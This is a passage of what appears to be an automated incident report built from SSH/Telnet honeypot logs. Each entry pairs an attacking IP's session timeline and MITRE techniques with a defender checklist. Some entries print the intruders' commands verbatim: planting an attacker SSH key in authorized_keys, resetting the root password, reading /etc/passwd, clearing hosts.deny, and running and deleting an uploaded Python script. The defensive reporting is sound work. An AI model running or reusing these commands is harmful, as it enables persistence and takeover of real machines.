| `2026-09-09 15:19:49` | `cowrie.client.version` |
| `2026-09-09 15:19:49` | `cowrie.client.kex` |
| `2026-09-09 15:19:49` | `cowrie.login.success` |
| `2026-09-09 15:19:50` | `cowrie.session.params` |
| `2026-09-09 15:19:50` | `cowrie.command.input` |
| `2026-09-09 15:19:50` | `cowrie.log.closed` |
| `2026-09-09 15:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.227.36[.]5` to AbuseIPDB if not already reported
- [ ] Block `64.227.36[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b496e126ce5c

| Field | Detail |
|---|---|
| **Source IP** | `47.80.68[.]74` |
| **First Seen** | 2026-09-09 15:23 |
| **Last Seen** | 2026-09-09 15:24 |
| **Session Duration** | 62s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:23:28` | `cowrie.session.connect` |
| `2026-09-09 15:23:28` | `cowrie.telnet.option` |
| `2026-09-09 15:23:29` | `cowrie.telnet.option` |
| `2026-09-09 15:23:29` | `cowrie.login.success` |
| `2026-09-09 15:23:29` | `cowrie.session.params` |
| `2026-09-09 15:23:29` | `cowrie.telnet.option` |
| `2026-09-09 15:23:29` | `cowrie.telnet.option` |
| `2026-09-09 15:23:29` | `cowrie.command.input` |
| `2026-09-09 15:23:29` | `cowrie.command.input` |
| `2026-09-09 15:23:29` | `cowrie.command.input` |
| `2026-09-09 15:23:30` | `cowrie.command.input` |
| `2026-09-09 15:23:30` | `cowrie.command.failed` |
| `2026-09-09 15:23:30` | `cowrie.command.input` |
| `2026-09-09 15:23:30` | `cowrie.command.failed` |
| `2026-09-09 15:23:30` | `cowrie.command.input` |
| `2026-09-09 15:23:30` | `cowrie.command.failed` |
| `2026-09-09 15:23:30` | `cowrie.command.input` |
| `2026-09-09 15:23:30` | `cowrie.command.input` |
| `2026-09-09 15:23:30` | `cowrie.command.input` |
| `2026-09-09 15:23:30` | `cowrie.command.input` |
| `2026-09-09 15:23:30` | `cowrie.command.failed` |
| `2026-09-09 15:23:30` | `cowrie.command.input` |
| `2026-09-09 15:23:30` | `cowrie.command.failed` |
| `2026-09-09 15:23:30` | `cowrie.command.input` |
| `2026-09-09 15:23:30` | `cowrie.command.failed` |
| `2026-09-09 15:23:30` | `cowrie.command.input` |
| `2026-09-09 15:23:30` | `cowrie.command.failed` |
| `2026-09-09 15:23:30` | `cowrie.command.input` |
| `2026-09-09 15:23:30` | `cowrie.command.input` |
| `2026-09-09 15:23:30` | `cowrie.command.failed` |
| `2026-09-09 15:23:30` | `cowrie.command.input` |
| `2026-09-09 15:23:30` | `cowrie.command.input` |
| `2026-09-09 15:24:30` | `cowrie.log.closed` |
| `2026-09-09 15:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.68[.]74` to AbuseIPDB if not already reported
- [ ] Block `47.80.68[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d55d5eb6fe05

| Field | Detail |
|---|---|
| **Source IP** | `123.139.242[.]2` |
| **First Seen** | 2026-09-09 15:32 |
| **Last Seen** | 2026-09-09 15:37 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:32:30` | `cowrie.session.connect` |
| `2026-09-09 15:32:30` | `cowrie.client.version` |
| `2026-09-09 15:32:30` | `cowrie.client.kex` |
| `2026-09-09 15:32:31` | `cowrie.login.success` |
| `2026-09-09 15:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.139.242[.]2` to AbuseIPDB if not already reported
- [ ] Block `123.139.242[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25f60624afb4

| Field | Detail |
|---|---|
| **Source IP** | `104.131.37[.]35` |
| **First Seen** | 2026-09-09 15:34 |
| **Last Seen** | 2026-09-09 15:34 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:34:11` | `cowrie.session.connect` |
| `2026-09-09 15:34:13` | `cowrie.client.version` |
| `2026-09-09 15:34:13` | `cowrie.client.kex` |
| `2026-09-09 15:34:19` | `cowrie.login.success` |
| `2026-09-09 15:34:22` | `cowrie.session.params` |
| `2026-09-09 15:34:22` | `cowrie.command.input` |
| `2026-09-09 15:34:23` | `cowrie.log.closed` |
| `2026-09-09 15:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.131.37[.]35` to AbuseIPDB if not already reported
- [ ] Block `104.131.37[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2234637666e5

| Field | Detail |
|---|---|
| **Source IP** | `141.148.157[.]218` |
| **First Seen** | 2026-09-09 15:36 |
| **Last Seen** | 2026-09-09 15:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:36:33` | `cowrie.session.connect` |
| `2026-09-09 15:36:33` | `cowrie.client.version` |
| `2026-09-09 15:36:33` | `cowrie.client.kex` |
| `2026-09-09 15:36:33` | `cowrie.login.success` |
| `2026-09-09 15:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.148.157[.]218` to AbuseIPDB if not already reported
- [ ] Block `141.148.157[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c24a79be4a0

| Field | Detail |
|---|---|
| **Source IP** | `141.148.157[.]218` |
| **First Seen** | 2026-09-09 15:36 |
| **Last Seen** | 2026-09-09 15:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:36:34` | `cowrie.session.connect` |
| `2026-09-09 15:36:34` | `cowrie.client.version` |
| `2026-09-09 15:36:34` | `cowrie.client.kex` |
| `2026-09-09 15:36:34` | `cowrie.login.success` |
| `2026-09-09 15:36:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.148.157[.]218` to AbuseIPDB if not already reported
- [ ] Block `141.148.157[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ecf3933ea1a

| Field | Detail |
|---|---|
| **Source IP** | `141.148.157[.]218` |
| **First Seen** | 2026-09-09 15:36 |
| **Last Seen** | 2026-09-09 15:38 |
| **Session Duration** | 125s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:36:40` | `cowrie.session.connect` |
| `2026-09-09 15:36:40` | `cowrie.client.version` |
| `2026-09-09 15:36:40` | `cowrie.client.kex` |
| `2026-09-09 15:36:40` | `cowrie.login.success` |
| `2026-09-09 15:36:41` | `cowrie.session.file_upload` |
| `2026-09-09 15:36:42` | `cowrie.session.params` |
| `2026-09-09 15:36:42` | `cowrie.command.input` |
| `2026-09-09 15:36:42` | `cowrie.command.input` |
| `2026-09-09 15:36:42` | `cowrie.command.input` |
| `2026-09-09 15:36:42` | `cowrie.command.failed` |
| `2026-09-09 15:36:42` | `cowrie.log.closed` |
| `2026-09-09 15:36:42` | `cowrie.session.params` |
| `2026-09-09 15:36:43` | `cowrie.command.input` |
| `2026-09-09 15:36:43` | `cowrie.log.closed` |
| `2026-09-09 15:36:43` | `cowrie.session.params` |
| `2026-09-09 15:36:43` | `cowrie.command.input` |
| `2026-09-09 15:36:43` | `cowrie.log.closed` |
| `2026-09-09 15:36:44` | `cowrie.session.params` |
| `2026-09-09 15:36:44` | `cowrie.command.input` |
| `2026-09-09 15:36:44` | `cowrie.command.failed` |
| `2026-09-09 15:36:44` | `cowrie.command.failed` |
| `2026-09-09 15:37:45` | `cowrie.session.params` |
| `2026-09-09 15:37:45` | `cowrie.command.input` |
| `2026-09-09 15:38:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.148.157[.]218` to AbuseIPDB if not already reported
- [ ] Block `141.148.157[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5da040b2287

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-09-09 15:50 |
| **Last Seen** | 2026-09-09 15:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:50:14` | `cowrie.session.connect` |
| `2026-09-09 15:50:14` | `cowrie.client.version` |
| `2026-09-09 15:50:14` | `cowrie.client.kex` |
| `2026-09-09 15:50:15` | `cowrie.login.success` |
| `2026-09-09 15:50:16` | `cowrie.session.params` |
| `2026-09-09 15:50:16` | `cowrie.command.input` |
| `2026-09-09 15:50:16` | `cowrie.command.failed` |
| `2026-09-09 15:50:16` | `cowrie.log.closed` |
| `2026-09-09 15:50:17` | `cowrie.session.params` |
| `2026-09-09 15:50:17` | `cowrie.command.input` |
| `2026-09-09 15:50:17` | `cowrie.session.file_download` |
| `2026-09-09 15:50:17` | `cowrie.log.closed` |
| `2026-09-09 15:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76fab506d57

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-09-09 15:50 |
| **Last Seen** | 2026-09-09 15:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:50:18` | `cowrie.session.connect` |
| `2026-09-09 15:50:18` | `cowrie.client.version` |
| `2026-09-09 15:50:18` | `cowrie.client.kex` |
| `2026-09-09 15:50:19` | `cowrie.login.success` |
| `2026-09-09 15:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4219343b2e55

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-09-09 15:50 |
| **Last Seen** | 2026-09-09 15:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:50:19` | `cowrie.session.connect` |
| `2026-09-09 15:50:19` | `cowrie.client.version` |
| `2026-09-09 15:50:20` | `cowrie.client.kex` |
| `2026-09-09 15:50:21` | `cowrie.login.success` |
| `2026-09-09 15:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c659d56cd763

| Field | Detail |
|---|---|
| **Source IP** | `101.126.64[.]76` |
| **First Seen** | 2026-09-09 16:04 |
| **Last Seen** | 2026-09-09 16:04 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:04:20` | `cowrie.session.connect` |
| `2026-09-09 16:04:20` | `cowrie.client.version` |
| `2026-09-09 16:04:20` | `cowrie.client.kex` |
| `2026-09-09 16:04:22` | `cowrie.login.success` |
| `2026-09-09 16:04:23` | `cowrie.session.params` |
| `2026-09-09 16:04:23` | `cowrie.command.input` |
| `2026-09-09 16:04:23` | `cowrie.command.failed` |
| `2026-09-09 16:04:24` | `cowrie.log.closed` |
| `2026-09-09 16:04:25` | `cowrie.session.params` |
| `2026-09-09 16:04:25` | `cowrie.command.input` |
| `2026-09-09 16:04:26` | `cowrie.session.file_download` |
| `2026-09-09 16:04:26` | `cowrie.log.closed` |
| `2026-09-09 16:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.64[.]76` to AbuseIPDB if not already reported
- [ ] Block `101.126.64[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-771b0a3235ca

| Field | Detail |
|---|---|
| **Source IP** | `101.126.64[.]76` |
| **First Seen** | 2026-09-09 16:04 |
| **Last Seen** | 2026-09-09 16:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:04:26` | `cowrie.session.connect` |
| `2026-09-09 16:04:26` | `cowrie.client.version` |
| `2026-09-09 16:04:26` | `cowrie.client.kex` |
| `2026-09-09 16:04:29` | `cowrie.login.success` |
| `2026-09-09 16:04:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.64[.]76` to AbuseIPDB if not already reported
- [ ] Block `101.126.64[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d83ace94ebc

| Field | Detail |
|---|---|
| **Source IP** | `101.126.64[.]76` |
| **First Seen** | 2026-09-09 16:04 |
| **Last Seen** | 2026-09-09 16:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:04:30` | `cowrie.session.connect` |
| `2026-09-09 16:04:30` | `cowrie.client.version` |
| `2026-09-09 16:04:30` | `cowrie.client.kex` |
| `2026-09-09 16:04:33` | `cowrie.login.success` |
| `2026-09-09 16:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.64[.]76` to AbuseIPDB if not already reported
- [ ] Block `101.126.64[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d84254fdc945

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-09 16:18 |
| **Last Seen** | 2026-09-09 16:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:18:34` | `cowrie.session.connect` |
| `2026-09-09 16:18:34` | `cowrie.client.version` |
| `2026-09-09 16:18:34` | `cowrie.client.kex` |
| `2026-09-09 16:18:35` | `cowrie.login.success` |
| `2026-09-09 16:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d212ebd8a314

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-09 16:18 |
| **Last Seen** | 2026-09-09 16:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:18:34` | `cowrie.session.connect` |
| `2026-09-09 16:18:34` | `cowrie.client.version` |
| `2026-09-09 16:18:34` | `cowrie.client.kex` |
| `2026-09-09 16:18:35` | `cowrie.login.success` |
| `2026-09-09 16:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3be225383d9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-09 16:24 |
| **Last Seen** | 2026-09-09 16:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:24:17` | `cowrie.session.connect` |
| `2026-09-09 16:24:17` | `cowrie.client.version` |
| `2026-09-09 16:24:18` | `cowrie.client.kex` |
| `2026-09-09 16:24:20` | `cowrie.login.success` |
| `2026-09-09 16:24:20` | `cowrie.direct-tcpip.request` |
| `2026-09-09 16:24:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-09 16:24:22` | `cowrie.direct-tcpip.data` |
| `2026-09-09 16:24:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46fe656d726f

| Field | Detail |
|---|---|
| **Source IP** | `141.148.157[.]218` |
| **First Seen** | 2026-09-09 16:38 |
| **Last Seen** | 2026-09-09 16:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:38:45` | `cowrie.session.connect` |
| `2026-09-09 16:38:45` | `cowrie.client.version` |
| `2026-09-09 16:38:45` | `cowrie.client.kex` |
| `2026-09-09 16:38:45` | `cowrie.login.success` |
| `2026-09-09 16:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.148.157[.]218` to AbuseIPDB if not already reported
- [ ] Block `141.148.157[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2582dd37023e

| Field | Detail |
|---|---|
| **Source IP** | `141.148.157[.]218` |
| **First Seen** | 2026-09-09 16:38 |
| **Last Seen** | 2026-09-09 16:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:38:45` | `cowrie.session.connect` |
| `2026-09-09 16:38:45` | `cowrie.client.version` |
| `2026-09-09 16:38:45` | `cowrie.client.kex` |
| `2026-09-09 16:38:45` | `cowrie.login.success` |
| `2026-09-09 16:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.148.157[.]218` to AbuseIPDB if not already reported
- [ ] Block `141.148.157[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a8f0573b960

| Field | Detail |
|---|---|
| **Source IP** | `141.148.157[.]218` |
| **First Seen** | 2026-09-09 16:38 |
| **Last Seen** | 2026-09-09 16:40 |
| **Session Duration** | 125s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:38:49` | `cowrie.session.connect` |
| `2026-09-09 16:38:49` | `cowrie.client.version` |
| `2026-09-09 16:38:50` | `cowrie.client.kex` |
| `2026-09-09 16:38:50` | `cowrie.login.success` |
| `2026-09-09 16:38:51` | `cowrie.session.file_upload` |
| `2026-09-09 16:38:51` | `cowrie.session.params` |
| `2026-09-09 16:38:51` | `cowrie.command.input` |
| `2026-09-09 16:38:51` | `cowrie.command.input` |
| `2026-09-09 16:38:51` | `cowrie.command.input` |
| `2026-09-09 16:38:51` | `cowrie.command.failed` |
| `2026-09-09 16:38:51` | `cowrie.log.closed` |
| `2026-09-09 16:38:52` | `cowrie.session.params` |
| `2026-09-09 16:38:52` | `cowrie.command.input` |
| `2026-09-09 16:38:52` | `cowrie.log.closed` |
| `2026-09-09 16:38:53` | `cowrie.session.params` |
| `2026-09-09 16:38:53` | `cowrie.command.input` |
| `2026-09-09 16:38:53` | `cowrie.log.closed` |
| `2026-09-09 16:38:54` | `cowrie.session.params` |
| `2026-09-09 16:38:54` | `cowrie.command.input` |
| `2026-09-09 16:38:54` | `cowrie.command.failed` |
| `2026-09-09 16:38:54` | `cowrie.command.failed` |
| `2026-09-09 16:39:54` | `cowrie.session.params` |
| `2026-09-09 16:39:54` | `cowrie.command.input` |
| `2026-09-09 16:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.148.157[.]218` to AbuseIPDB if not already reported
- [ ] Block `141.148.157[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-975f91f29bd0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 16:45 |
| **Last Seen** | 2026-09-09 16:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:45:24` | `cowrie.session.connect` |
| `2026-09-09 16:45:25` | `cowrie.client.version` |
| `2026-09-09 16:45:25` | `cowrie.client.kex` |
| `2026-09-09 16:45:31` | `cowrie.login.success` |
| `2026-09-09 16:45:33` | `cowrie.session.params` |
| `2026-09-09 16:45:33` | `cowrie.command.input` |
| `2026-09-09 16:45:34` | `cowrie.log.closed` |
| `2026-09-09 16:45:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bfd6bbbbbce

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:45 |
| **Last Seen** | 2026-09-09 16:46 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:g5XeK0fl9DaG"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:45:28` | `cowrie.session.connect` |
| `2026-09-09 16:45:31` | `cowrie.client.version` |
| `2026-09-09 16:45:31` | `cowrie.client.kex` |
| `2026-09-09 16:45:33` | `cowrie.login.success` |
| `2026-09-09 16:45:35` | `cowrie.session.params` |
| `2026-09-09 16:45:35` | `cowrie.command.input` |
| `2026-09-09 16:45:35` | `cowrie.command.failed` |
| `2026-09-09 16:45:35` | `cowrie.log.closed` |
| `2026-09-09 16:45:36` | `cowrie.session.params` |
| `2026-09-09 16:45:36` | `cowrie.command.input` |
| `2026-09-09 16:45:36` | `cowrie.session.file_download` |
